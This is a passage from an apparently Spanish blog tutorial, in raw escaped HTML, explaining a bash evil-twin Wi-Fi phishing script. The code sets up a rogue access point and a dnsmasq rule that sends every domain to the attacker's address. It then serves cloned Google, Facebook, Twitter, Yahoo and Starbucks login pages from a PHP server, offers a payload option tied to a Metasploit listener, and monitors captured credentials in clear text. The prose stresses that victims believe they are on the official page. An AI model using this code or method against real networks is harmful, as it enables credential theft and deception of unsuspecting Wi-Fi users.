	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;log-dhcp&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dnsmasq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;listen-address=127.0.0.1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dnsmasq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;address=/#/192.168.1.1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dnsmasq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;ifconfig&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;choosed_interface&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;up&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;192.168.1.1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;netmask&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;255.255.255.0&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;route&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;net&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;192.168.1.0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;netmask&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;255.255.255.0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gw&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;192.168.1.1&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;dnsmasq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dnsmasq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;5&lt;/span&gt;
    &lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;    
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Consideración&lt;/strong&gt;: A nivel de código, la tarjeta de red que ha sido configurada por defecto tiene nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wlan0&lt;/code&gt;. Es importante tener en cuenta que esto no siempre es así, las tarjetas de red pueden referenciarse por nombres distintos y no siempre se llaman igual. En caso de ser distinto, es necesario cambiar su nombre desde el propio código.&lt;/p&gt;

&lt;p&gt;En esta fase se nos solicitan varias cosas:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Nombre del punto de acceso.&lt;/li&gt;
  &lt;li&gt;Canal en el que queremos que el punto de acceso opere.&lt;/li&gt;
  &lt;li&gt;Interfaz de red a utilizar (por defecto &lt;strong&gt;wlan0&lt;/strong&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Una vez rellenados estos puntos, se desplegará un AP con las configuraciones especificadas, asignado la dirección IP ‘&lt;strong&gt;192.168.1.1&lt;/strong&gt;’ a nuestra interfaz de red en modo monitor.&lt;/p&gt;

&lt;p&gt;Ya con estas especificaciones seteadas, se procede a la selección de plantilla:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Array&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;de&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plantillas&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;plantillas&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;facebook&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;google&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;starbucks&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;twitter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yahoo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cliqq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;optimumwifi&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;all_in_one&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;tput&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cnorm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ne&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${blueColour}[Información]${endColour}${yellowColour} Si deseas usar tu propia plantilla, crea otro directorio en el proyecto y especifica su nombre :)${endColour}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ne&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;${yellowColour}[*]${endColour}${grayColour} Plantilla a utilizar (facebook-login, google-login, starbucks-login, twitter-login, yahoo-login, cliqq-payload, all_in_one, optimumwifi):${endColour} &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;template&lt;/span&gt;

	&lt;span class=&quot;n&quot;&gt;check_plantillas&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;plantilla&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;${plantillas[@]}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;$plantilla&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;$template&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;then&lt;/span&gt;
			&lt;span class=&quot;n&quot;&gt;check_plantillas&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;fi&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;done&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;$template&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;cliqq-payload&quot;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;then&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;check_plantillas&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;fi&lt;/span&gt;

	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check_plantillas&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eq&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;then&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;tput&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;civis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pushd&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;template&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}&quot;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;S&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;192.168.1.1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;popd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getCredentials&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;elif&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check_plantillas&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eq&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;then&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;tput&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;civis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pushd&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;template&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${yellowColour}[*]${endColour}${grayColour} Montando servidor PHP...${endColour}&quot;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;S&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;192.168.1.1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${yellowColour}[*]${endColour}${grayColour} Configura desde otra consola un Listener en Metasploit de la siguiente forma:${endColour}&quot;&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ne&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;${redColour}-&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;${endColour}&quot;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;msfconsole&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rc&lt;/span&gt;
		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seq&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ne&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;${redColour}-&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;done&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;${endColour}&quot;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${redColour}[!] Presiona &amp;lt;Enter&amp;gt; para continuar${endColour}&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;popd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getCredentials&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;tput&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;civis&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${yellowColour}[*]${endColour}${grayColour} Usando plantilla personalizada...${endColour}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;${yellowColour}[*]${endColour}${grayColour} Montando servidor web en${endColour}${blueColour} $template${endColour}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;pushd&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;template&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;S&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;192.168.1.1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;80&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;
		&lt;span class=&quot;n&quot;&gt;popd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dev&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;null&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getCredentials&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;fi&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Es de esperar que en esta fase, se nos solicite con qué plantilla queremos trabajar.&lt;/p&gt;

&lt;p&gt;En caso de seleccionar alguna, por ejemplo imaginemos… ‘&lt;strong&gt;google-login&lt;/strong&gt;’, lo que sucederá es que desde que el cliente se conecte al AP, automáticamente se le abrirá el navegador, siendo redirigido a un portal de autenticación, en este caso, de la plataforma de Google, donde verá que para continuar navegando es necesario loguearse con su cuenta de la plantilla seleccionada.&lt;/p&gt;

&lt;p&gt;La víctima en ningún momento verá direcciones IP ni nada por el estilo, por lo que le hará pensar en todo momento que se encuentra en la página oficial.&lt;/p&gt;

&lt;p&gt;Cada plantilla está organizada en su propio directorio, donde tras seleccionar aquella con la que queramos trabajar, se efectúa un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pushd&lt;/code&gt; hacia ese directorio para posteriormente montar un servidor web mediante &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;php&lt;/code&gt; hosteado por el puerto 80.&lt;/p&gt;

&lt;p&gt;Ya en este punto, se llama a la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getCredentials&lt;/code&gt;, que es la que se encargará de monitorizar un fichero desde el cual podremos saber en todo momento quién ha introducido sus credenciales, pudiéndolas ver posteriormente en texto claro:&lt;/p&gt;

&lt;div class=&quot;language-go highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getCredentials&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;

